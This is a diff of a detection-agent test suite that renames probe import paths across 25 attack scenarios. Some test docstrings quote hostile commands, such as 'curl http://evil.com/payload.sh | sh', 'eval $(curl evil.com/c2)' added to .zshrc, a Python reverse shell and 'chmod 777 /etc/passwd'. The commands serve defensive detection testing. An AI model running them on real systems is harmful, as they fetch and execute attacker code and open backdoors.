@@ -62,7 +62,7 @@ class TestScenario01_BinaryFromTemp:
     """An attacker drops a binary in /tmp and executes it."""
 
     def test_binary_from_tmp_fires(self):
-        from amoskys.agents.proc.probes import BinaryFromTempProbe
+        from amoskys.agents.shared.process.probes import BinaryFromTempProbe
 
         probe = BinaryFromTempProbe()
         context = _ctx(agent_name="proc")
@@ -78,8 +78,8 @@ class TestScenario01_BinaryFromTemp:
         }
 
         with (
-            patch("amoskys.agents.proc.probes.psutil") as mp,
-            patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True),
+            patch("amoskys.agents.shared.process.probes.psutil") as mp,
+            patch("amoskys.agents.shared.process.probes.PSUTIL_AVAILABLE", True),
         ):
             mp.process_iter.return_value = [mock_proc]
             mp.NoSuchProcess = real_psutil.NoSuchProcess
@@ -104,7 +104,7 @@ class TestScenario02_CurlPipeShell:
     """Attacker runs 'curl http://evil.com/payload.sh | sh'."""
 
     def test_lolbin_curl_with_suspicious_cmdline(self):
-        from amoskys.agents.proc.probes import LOLBinExecutionProbe
+        from amoskys.agents.shared.process.probes import LOLBinExecutionProbe
 
         probe = LOLBinExecutionProbe()
         context = _ctx(agent_name="proc")
@@ -121,8 +121,8 @@ class TestScenario02_CurlPipeShell:
         }
 
         with (
-            patch("amoskys.agents.proc.probes.psutil") as mp,
-            patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True),
+            patch("amoskys.agents.shared.process.probes.psutil") as mp,
+            patch("amoskys.agents.shared.process.probes.PSUTIL_AVAILABLE", True),
         ):
             mp.process_iter.return_value = [mock_proc]
             mp.NoSuchProcess = real_psutil.NoSuchProcess
@@ -147,7 +147,7 @@ class TestScenario03_PythonReverseShell:
     """Attacker spawns: python3 -c 'import socket,subprocess,os; ...'"""
 
     def test_script_interpreter_detects_reverse_shell(self):
-        from amoskys.agents.proc.probes import ScriptInterpreterProbe
+        from amoskys.agents.shared.process.probes import ScriptInterpreterProbe
 
         probe = ScriptInterpreterProbe()
         context = _ctx(agent_name="proc")
@@ -166,8 +166,8 @@ class TestScenario03_PythonReverseShell:
         }
 
         with (
-            patch("amoskys.agents.proc.probes.psutil") as mp,
-            patch("amoskys.agents.proc.probes.PSUTIL_AVAILABLE", True),
+            patch("amoskys.agents.shared.process.probes.psutil") as mp,
+            patch("amoskys.agents.shared.process.probes.PSUTIL_AVAILABLE", True),
         ):
             mp.process_iter.return_value = [mock_proc]
             mp.NoSuchProcess = real_psutil.NoSuchProcess
@@ -192,7 +192,7 @@ class TestScenario04_LaunchAgentPersistence:
     """Attacker creates a malicious LaunchAgent plist."""
 
     def test_launchd_persistence_created(self):
-        from amoskys.agents.persistence.probes import (
+        from amoskys.agents.shared.persistence.probes import (
             LaunchAgentDaemonProbe,
             PersistenceChange,
             PersistenceChangeType,
@@ -248,7 +248,7 @@ class TestScenario05_ShellProfileHijack:
     """Attacker appends 'eval $(curl evil.com/c2)' to .zshrc."""
 
     def test_shell_profile_hijack_fires(self):
-        from amoskys.agents.persistence.probes import (
+        from amoskys.agents.shared.persistence.probes import (
             PersistenceChange,
             PersistenceChangeType,
             PersistenceEntry,
@@ -315,7 +315,7 @@ class TestScenario06_CronPersistence:
     """Attacker adds @reboot cron entry with reverse shell."""
 
     def test_cron_persistence_created(self):
-        from amoskys.agents.persistence.probes import (
+        from amoskys.agents.shared.persistence.probes import (
             CronJobPersistenceProbe,
             PersistenceChange,
             PersistenceChangeType,
@@ -369,7 +369,7 @@ class TestScenario07_WebshellDrop:
     """Attacker drops a PHP webshell in /var/www/html/."""
 
     def test_webshell_detected(self, tmp_path):
-        from amoskys.agents.fim.probes import (
+        from amoskys.agents.shared.filesystem.probes import (
             ChangeType,
             FileChange,
             FileState,
@@ -425,7 +425,7 @@ class TestScenario08_WorldWritable:
     """Attacker runs 'chmod 777 /etc/passwd'."""
 
     def test_world_writable_sensitive_fires(self):
-        from amoskys.agents.fim.probes import (
+        from amoskys.agents.shared.filesystem.probes import (
             ChangeType,
             FileChange,
             FileState,
@@ -485,7 +485,7 @@ class TestScenario09_NXDomainBurst:
     """Malware probes 50 random subdomains → all return NXDOMAIN."""
 
     def test_nxdomain_burst_fires(self):
-        from amoskys.agents.dns.probes import DNSQuery, NXDomainBurstProbe
+        from amoskys.agents.shared.dns.probes import DNSQuery, NXDomainBurstProbe
 
         probe = NXDomainBurstProbe()
         now = datetime.now(timezone.utc)
@@ -521,7 +521,7 @@ class TestScenario10_DGADomains:
     """Malware resolves DGA-generated domains with high entropy."""
 
     def test_dga_score_fires(self):
-        from amoskys.agents.dns.probes import DGAScoreProbe, DNSQuery
+        from amoskys.agents.shared.dns.probes import DGAScoreProbe, DNSQuery
 
         probe = DGAScoreProbe()
         now = datetime.now(timezone.utc)
@@ -565,7 +565,7 @@ class TestScenario11_USBStorage:
     """Attacker inserts a USB flash drive."""
 
     def test_usb_storage_detected(self):
-        from amoskys.agents.peripheral.probes import USBDevice, USBStorageProbe
+        from amoskys.agents.shared.peripheral.probes import USBDevice, USBStorageProbe
 
         probe = USBStorageProbe()
 
@@ -604,7 +604,7 @@ class TestScenario12_SudoElevation:
     """User runs 'sudo ls' — first-time sudo for this user."""
 
     def test_sudo_elevation_first_use(self):
-        from amoskys.agents.auth.probes import AuthEvent, SudoElevationProbe
+        from amoskys.agents.shared.auth.probes import AuthEvent, SudoElevationProbe
 
         probe = SudoElevationProbe()
         now = _now_ns()
@@ -642,7 +642,7 @@ class TestScenario13_SUIDbitChange:
     """Attacker sets SUID bit on a binary for privilege escalation."""
 
     def test_suid_bit_fires(self):
-        from amoskys.agents.fim.probes import (
+        from amoskys.agents.shared.filesystem.probes import (
             ChangeType,
             FileChange,
             FileState,
@@ -702,7 +702,7 @@ class TestScenario14_ConfigBackdoor:
     """Attacker modifies sshd_config to enable root login."""
 
     def test_ssh_config_backdoor_fires(self, tmp_path):
-        from amoskys.agents.fim.probes import (
+        from amoskys.agents.shared.filesystem.probes import (
             ChangeType,
             ConfigBackdoorProbe,
             FileChange,
@@ -754,7 +754,7 @@ class TestScenario15_SSHKeyBackdoor:
     """Attacker adds unauthorized SSH public key to root's authorized_keys."""
 
     def test_ssh_key_backdoor_fires(self):
-        from amoskys.agents.persistence.probes import (
+        from amoskys.agents.shared.persistence.probes import (
             PersistenceChange,
             PersistenceChangeType,
             PersistenceEntry,
@@ -808,7 +808,7 @@ class TestScenario16_HiddenFile:
     """Attacker drops hidden executable in home directory."""
 
     def test_hidden_file_persistence_fires(self):
-        from amoskys.agents.persistence.probes import (
+        from amoskys.agents.shared.persistence.probes import (
             HiddenFilePersistenceProbe,
             PersistenceChange,
             PersistenceChangeType,
@@ -862,7 +862,7 @@ class TestScenario17_PortScan:
     """Attacker scans 25 ports on internal target."""
 
     def test_vertical_port_scan_fires(self):
-        from amoskys.agents.flow.probes import FlowEvent, PortScanSweepProbe
+        from amoskys.agents.shared.network.probes import FlowEvent, PortScanSweepProbe
 
         probe = PortScanSweepProbe()
         now = _now_ns()
@@ -902,7 +902,10 @@ class TestScenario18_DataExfil:
     """Attacker exfiltrates 55 MB to external IP."""
 
     def test_exfil_volume_spike_fires(self):
-        from amoskys.agents.flow.probes import DataExfilVolumeSpikeProbe, FlowEvent
+        from amoskys.agents.shared.network.probes import (
+            DataExfilVolumeSpikeProbe,
+            FlowEvent,
+        )
 
         probe = DataExfilVolumeSpikeProbe()
         now = _now_ns()
@@ -944,7 +947,7 @@ class TestScenario19_C2Beacon:
     """Malware beacons every 60s with small payloads."""
 
     def test_c2_beacon_fires(self):
-        from amoskys.agents.flow.probes import C2BeaconFlowProbe, FlowEvent
+        from amoskys.agents.shared.network.probes import C2BeaconFlowProbe, FlowEvent
 
         probe = C2BeaconFlowProbe()
         now = _now_ns()
@@ -988,7 +991,10 @@ class TestScenario20_SuspiciousTunnel:
     """Long-lived SSH tunnel with small packet sizes."""
 
     def test_suspicious_tunnel_fires(self):
-        from amoskys.agents.flow.probes import FlowEvent, SuspiciousTunnelProbe
+        from amoskys.agents.shared.network.probes import (
+            FlowEvent,
+            SuspiciousTunnelProbe,
+        )
 
         probe = SuspiciousTunnelProbe()
         now = _now_ns()
@@ -1030,7 +1036,7 @@ class TestScenario21_SuspiciousTLD:
     """Malware queries domains on high-risk TLDs (.xyz, .top, .tk)."""
 
     def test_suspicious_tld_fires(self):
-        from amoskys.agents.dns.probes import DNSQuery, SuspiciousTLDProbe
+        from amoskys.agents.shared.dns.probes import DNSQuery, SuspiciousTLDProbe
 
         probe = SuspiciousTLDProbe()
         now = datetime.now(timezone.utc)
@@ -1066,7 +1072,7 @@ class TestScenario22_DNSTunneling:
     """Attacker exfiltrates data via encoded TXT record queries."""
 
     def test_dns_tunneling_fires(self):
-        from amoskys.agents.dns.probes import DNSQuery, LargeTXTTunnelingProbe
+        from amoskys.agents.shared.dns.probes import DNSQuery, LargeTXTTunnelingProbe
 
         probe = LargeTXTTunnelingProbe()
         now = datetime.now(timezone.utc)
@@ -1104,11 +1110,11 @@ class TestScenario23_SSHBruteForce:
     def test_ssh_brute_force_fires(self):
         from datetime import datetime, timezone
 
-        from amoskys.agents.protocol_collectors.agent_types import (
+        from amoskys.agents.shared.protocol_collectors.agent_types import (
             ProtocolEvent,
             ProtocolType,
         )
-        from amoskys.agents.protocol_collectors.probes import SSHBruteForceProbe
+        from amoskys.agents.shared.protocol_collectors.probes import SSHBruteForceProbe
 
         probe = SSHBruteForceProbe()
         now_dt = datetime.now(timezone.utc)
@@ -1134,7 +1140,10 @@ class TestScenario23_SSHBruteForce:
 
         assert len(events) >= 1
         ev = events[0]
-        assert "brute" in ev.data.get("description", "").lower() or "brute" in ev.event_type.lower()
+        assert (
+            "brute" in ev.data.get("description", "").lower()
+            or "brute" in ev.event_type.lower()
+        )
         assert ev.severity in (Severity.HIGH, Severity.CRITICAL)
         assert any("T1110" in t for t in ev.mitre_techniques)
 
@@ -1148,8 +1157,8 @@ class TestScenario24_ExecveFromTmp:
     """Attacker executes dropped binary from /tmp via kernel audit trail."""
 
     def test_execve_high_risk_fires(self):
-        from amoskys.agents.kernel_audit.agent_types import KernelAuditEvent
-        from amoskys.agents.kernel_audit.probes import ExecveHighRiskProbe
+        from amoskys.agents.os.linux.kernel_audit.agent_types import KernelAuditEvent
+        from amoskys.agents.os.linux.kernel_audit.probes import ExecveHighRiskProbe
 
         probe = ExecveHighRiskProbe()
         now = _now_ns()
@@ -1195,8 +1204,8 @@ class TestScenario25_SyscallFlood:
     """Attacker's tool generates rapid syscall burst."""
 
     def test_syscall_flood_fires(self):
-        from amoskys.agents.kernel_audit.agent_types import KernelAuditEvent
-        from amoskys.agents.kernel_audit.probes import SyscallFloodProbe
+        from amoskys.agents.os.linux.kernel_audit.agent_types import KernelAuditEvent
+        from amoskys.agents.os.linux.kernel_audit.probes import SyscallFloodProbe
 
         probe = SyscallFloodProbe()
         now = _now_ns()
